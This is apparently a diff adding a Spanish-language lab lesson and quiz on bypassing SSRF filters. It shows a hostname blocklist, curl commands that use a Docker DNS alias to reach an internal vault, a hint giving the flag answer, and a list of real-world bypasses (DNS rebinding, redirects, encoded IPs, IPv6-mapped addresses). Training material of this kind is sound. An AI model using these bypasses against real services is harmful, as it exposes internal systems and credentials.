@@ -1,0 +1,36 @@
+---
+index: 3
+title: "SSRF Avanzado: bypass de filtros"
+questions:
+  - id: ssrf-basico-t03-q01
+    prompt: "El lab bloquea localhost y 127.0.0.1. ¿Qué hostname NO está bloqueado pero resuelve al mismo servidor?"
+    hint: "La pista está en el mensaje de error: hay un alias DNS."
+    kind: text
+  - id: ssrf-basico-t03-q02
+    prompt: "Envía la flag que obtienes al bypassear el filtro con el alias."
+    hint: "curl el /fetch con url=http://ssrf-alias:8080/internal/vault"
+    kind: flag
+---
+
+## Bypass del filtro de SSRF
+
+El lab bloquea: `localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`, `169.254`.
+
+Pero el filtro solo comprueba el HOSTNAME de la URL. Y Docker crea aliases DNS
+internos que resuelven al mismo contenedor:
+
+```bash
+# Directo (bloqueado):
+curl "http://127.0.0.1:18095/fetch?url=http://localhost:8080/internal/vault"
+# → 🚫 Blocked
+
+# Con el alias (funciona):
+curl "http://127.0.0.1:18095/fetch?url=http://ssrf-alias:8080/internal/vault"
+# → ✅ Flag!
+```
+
+En producción real, los bypasses más comunes son:
+- **DNS rebinding**: un dominio que resuelve primero a una IP pública, luego a interna
+- **Redirects**: un servidor externo que hace 302 a localhost
+- **IP encoding**: hexadecimal (0x7f000001), octal (0177.0.0.1), decimal (2130706433)
+- **IPv6**: [::ffff:127.0.0.1] no siempre está en las listas de bloqueo
